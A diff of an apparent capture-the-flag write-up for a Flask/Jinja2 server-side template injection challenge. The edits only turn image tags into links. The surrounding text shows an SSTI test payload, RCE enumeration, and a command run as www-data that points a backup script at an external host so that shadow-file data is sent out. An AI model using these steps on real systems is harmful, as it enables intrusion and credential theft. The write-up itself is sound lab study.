@@ -136,9 +136,9 @@ Initial discovery activities of the website uncovered the following:
 <br>
 The hint indicates that the application is using Flask. There are two helpful resources for understanding SSTI:
 
-<img src="https://onsecurity.io/article/server-side-template-injection-with-jinja2/" alt="Server Side Template Injections with Jinja2">
+<a href="https://onsecurity.io/article/server-side-template-injection-with-jinja2/">Server Side Template Injections with Jinja2</a>
 
-<img src="https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/Python/#summary" alt="Server Side Template Injection - Python - Payloads All The Things">
+<a href="https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/Python/#summary">Server Side Template Injection - Python - Payloads All The Things</a>
 
 A basic test to see if SSTI is possible is {{7*7}}. Because the application evaluates the expression and displays the results on the page, the application is likely vulnerable.
 
@@ -197,7 +197,7 @@ Trial and error testing revealed the following filters and the obfuscations need
 <br>
 A script was used to enumerate the indexes and evaluate if RCE is possible. The initial command used was a simple 'whoami".
 
-The enumeration script source code is located here: <img src="/HHC_2025/resources/snowblind_enumeration2.py.txt" alt="Jinja2 SSTI Enumeration Script">
+The enumeration script source code is located here: <a href="/HHC_2025/resources/snowblind_enumeration2.py.txt">Jinja2 SSTI Enumeration Script</a>
 
 <img src="/HHC_2025/images/snowblind_enumeration1.jpg" alt="SSTI Enumeration">
 
@@ -235,7 +235,7 @@ The script does the following:
 
 <img src="/HHC_2025/images/snowblind_regex.jpg" alt="URL Regex">
 
-A copy of the backup script is located here: <img src="/HHC_2025/resources/snowblind_backup.py.txt" alt="Backup Script">
+A copy of the backup script is located here: <a href="/HHC_2025/resources/snowblind_backup.py.txt">Backup Script</a>
 
 An HTTP server was started on an external facing linux server on port 8000 to receive the data being exfitrated.
 
@@ -245,13 +245,13 @@ The following command was issued in the shell as www-data to trigger the data ex
 echo "http://45-79-190-29.ip.linodeusercontent.com:8000/exfil" > /dev/shm/.frosty999
 </code></pre>
 
-The exfiltrated data file is located here: <img src="/HHC_2025/resources/shadow_exfil.png" alt="Exfiltrated File">
+The exfiltrated data file is located here: <a href="/HHC_2025/resources/shadow_exfil.png">Exfiltrated File</a>
 
 <h2>Step Five:  Decode PNG file</h2>
 
 Since we have the backup script, we know the encryption mechanism. We also know what the first block of data encrypted is "root:$". With this information, we can decode the file.
 
-Using this script to decode: <img src="/HHC_2025/resources/snowblind_decodepng3.py.txt" alt="PNG Decoder Script">
+Using this script to decode: <a href="/HHC_2025/resources/snowblind_decodepng3.py.txt">PNG Decoder Script</a>
 
 The file was damaged or incomplete, so the script suppresses errors and forces the data to be extracted. The backup script indicates that the data is exfiltrated is stored in the Blue channel of the file. The other channels can be ignored. Running the script reveals the exfiltrated data stored in the file.
 
